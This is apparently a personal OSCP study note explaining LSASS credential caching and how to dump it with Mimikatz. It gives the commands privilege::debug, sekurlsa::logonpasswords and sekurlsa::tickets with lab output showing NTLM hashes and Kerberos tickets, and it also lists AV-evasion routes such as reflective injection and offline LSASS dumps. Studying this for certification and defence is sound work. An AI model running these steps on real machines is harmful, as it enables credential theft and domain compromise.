---
aliases:
  - Cached AD Credentials
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - active_directory
  - ad
  - adds
  - authentication
  - ad_auth
  - cache
  - cached_creds
author: Mehdi N Tehrani
creat_date: 2024-01-05
category: Cyber Security
subcategory: Offensive Security - OSCP
---
# LSASS
#lssas  #local_security_authority_subsystem_service 
Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request.

In modern versions of Windows, these hashes are stored in the **Local Security Authority Subsystem Service** ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) memory space.

LSASS process is part of the operating system and runs as SYSTEM, we need *SYSTEM* (or local administrator) permissions to gain access to the hashes stored on a target.

> The data structures used to store the hashes in memory are *not publicly documented*
> They are also encrypted with an LSASS-stored key.

# Mimikatz
#mimikatz 
Mimikatz is well-known and heavily blocked by AV solutions.

> **TGS** would allow us to access only particular resources associated with those tickets. 
> With **TGT**, we could request a TGS for specific resources we want to target within the domain.

Mimikatz can also export tickets to the hard drive and import tickets into LSASS

## Certificate Authority (CA)
#ca #certificate_authority
If a server is installed as a Certification Authority (CA), we could issue certificates for web servers to use HTTPS or to authenticate users based on certificates from the CA via [Smart Cards](https://en.wikipedia.org/wiki/Smart_card).

If a certificate sis marked as having a [*non-exportable private key*](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/marking-private-keys-as-non-exportable-with-certutil-importpfx/ba-p/1128390), a private key associated with a certificate cannot be exported even with administrative privileges. 
### workarounds
mimikatz crypto module #crypto #mimikatz_crypto #capi #keyIso #mimikatz_capi #mimikatz_keyiso
-  `crypto` module allows patching [CryptoAPI](https://docs.microsoft.com/en-us/windows/win32/seccrypto/cryptoapi-system-architecture) function to **make the key exportable**
	- using `crypto::capi`
	- or `KeyIso` service with `crypto::cng`

## workarounds
#mimikatz_bypass #av_evasion
### Memory Injection
#in_memory_injection #memory_injection 
[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)
Execute Mimikatz directly from memory using an injector like PowerShell

### Memory Dump
#memory_dump
- use a built-in tool like Task Manager to dump the entire LSASS process memory 
	- [lsass dump](https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/)
- Transfer data to a helper machine
- then [load the data into Mimikatz](http://www.fuzzysecurity.com/tutorials/18.html)


## Usage
Run
```cmd
c:\> mimikatz.exe
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
```

Escalate privileges
```mimikatz
privilege::debug
Privilege '20' OK
```

Dump cached credentials
#cached_creds 
```mimikatz
sekurlsa::logonpasswords

Authentication Id : 0 ; 4641600 (00000000:0046d340)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 1/5/2024 6:40:28 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 4400862 (00000000:004326de)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 1/5/2024 6:39:28 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
...
[SNIPPED]
...
```

Get cached tickets
#tickets #cached_tickets
```mimikatz
sekurlsa::tickets

Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 1/5/2024 6:24:25 PM ; 1/6/2024 4:23:25 AM ; 1/12/2024 6:23:25 PM
           Service Name (02) : cifs ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : CLIENT75$ ; @ CORP.COM ( corp.com )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             2bed5f13abc18503086df14112bf889c822e1ccc5b64b3af44ec241a264f9b78
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 11       [...]
         [00000001]
           Start/End/MaxRenew: 1/5/2024 6:24:25 PM ; 1/6/2024 4:23:25 AM ; 1/12/2024 6:23:25 PM
           Service Name (01) : CLIENT75$ ; @ CORP.COM
           Target Name  (01) : CLIENT75$ ; @ CORP.COM
           Client Name  (01) : CLIENT75$ ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             7d0d0e6a2ad8c255c84000e3e0688f07caebfea11cb9a7bc3f22c4324312b55b
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 11       [...]
         [00000002]
           Start/End/MaxRenew: 1/5/2024 6:23:32 PM ; 1/6/2024 4:23:25 AM ; 1/12/2024 6:23:25 PM
           Service Name (02) : LDAP ; DC1.corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; @ CORP.COM
           Client Name  (01) : CLIENT75$ ; @ CORP.COM
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             93a05b9c9ee152d1a06f3164ab88b88b8d2b944dff4ee47e15735aa24c84a382
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 11       [...]
         [00000003]
           Start/End/MaxRenew: 1/5/2024 6:23:25 PM ; 1/6/2024 4:23:25 AM ; 1/12/2024 6:23:25 PM
           Service Name (02) : ldap ; dc1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : ldap ; dc1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : CLIENT75$ ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             d7ddb82c242166fd3e0d5b6a2f4bb9194075f3ff15c7a409e1f96ec3c3269e56
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 11       [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 1/5/2024 6:24:25 PM ; 1/6/2024 4:23:25 AM ; 1/12/2024 6:23:25 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (--) : @ CORP.COM
           Client Name  (01) : CLIENT75$ ; @ CORP.COM ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             dc30380797db39c58dace165932d2ca615890c99d5d5c53350c20dd67ff8013d
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
         [00000001]
           Start/End/MaxRenew: 1/5/2024 6:23:25 PM ; 1/6/2024 4:23:25 AM ; 1/12/2024 6:23:25 PM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : CLIENT75$ ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             5dbba939f1a86a68af68e99f0ef64dd1b0a72f1914e0a1594609d2d9eb38e33f
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
```


